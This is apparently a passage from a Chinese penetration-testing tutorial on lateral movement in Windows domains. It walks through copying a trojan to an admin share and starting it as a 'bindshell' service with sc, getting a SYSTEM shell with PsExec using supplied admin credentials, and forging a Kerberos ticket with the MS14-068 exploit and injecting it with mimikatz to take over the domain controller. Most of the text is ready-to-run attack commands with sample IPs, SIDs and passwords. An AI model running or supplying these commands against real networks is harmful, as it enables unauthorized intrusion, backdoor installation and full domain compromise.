二.创建windows服务来进行横向移动

使用条件:1.当前跳板用户需要管理员权限(因为要创建用户) 

               2.与目标机器已经建立ipc连接

利用sc命令

  • 与目标主机建立空链接

  • copy c:\\shell.exe \\192.168.20.100\c$\shell.exe : 将木马文件移动到目标主机

  • sc \\192.168.20.100 create bindshell  binpath= "c:\shell.exe" : 创建一个名称为bindshell的后门服务

  • sc \\192.168.20.100 start bindshell : 立即启动该服务

  • sc \\192.168.20.100 delete bindshell : 删除该服务

三.利用PsExec.exe进行横向移动

paexec的使用前提:

  • 对方主机开启了admin$共享,如果关闭了会提示找不到网络名

  • 对方未开启防火墙

  • 如果是工作组环境,必须使用administrator用户连接(因为要在目标机上创建并启动服务),使用其他账号登陆都会提示拒绝访问

  • 如果是域环境,即可以用普通用户连接也可以用域管理员连接.连接普通域主机可以使用普通域用户,连接域控只能用域管理员账户

基本操作命令

psexec.exe -accepteula \\192.168.20.100 -u test.com\administrator -p 123.com -s cmd.exe   

-s : 以系统权限运行cmd进程

-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框

psexec.exe \\192.168.20.100 hostname : 执行系统命令(建立ipc空连接)

注意：在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。

六.票据传递攻击

上面我们所讲的PTH是基于NTLM认证的，接下来我们要讲的PTT是基于Kerberos协议进行攻击的，

我们在渗透测试中，要使用哈希传递攻击，则必须要获取目标机器的管理员权限。如果没有管理员权限，我们不妨用用票据传递攻击（PTT）。

在票据传递攻击（PTT）中，我们常用的有MS14-068、黄金票据、白银票据。其中MS14-068可用来横向获取域内主机权限(权限提升,提升为域管理员权限)，黄金票据、白银票据则可以用来对域控进行权限维持。这里我们主要讲解MS14-068，至于黄金票据、白银票据我们将在未来的域内权限维持中讲解。

条件:1.域内任何用户sid 2.域内任意用户密码

获取域成员sid

使用ms14-068生成tgt票据

ms14-068.exe -u xingming@test.com -s S-1-5-21-2665265530-2654977059-3380898188-1111 -d 192.168.20.100 -p 123.com
ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -p 域成员密码


生成tgt票据,TGT_xingming@test.com.ccache

接下来就是将该票据注入到windows7内存中去

mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list          //查看当前机器凭证mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中

可以看到票据已经注入成功,此时,攻击者可以利用windows7访问域内任意机器,可以使用net use进行登陆或者使用psexec,wmi等方法进行远程执行命令

可以看到已经可以访问域主机的c盘文件

然后可以使用sc注册服务,进而上线到msf,成功拿到域控
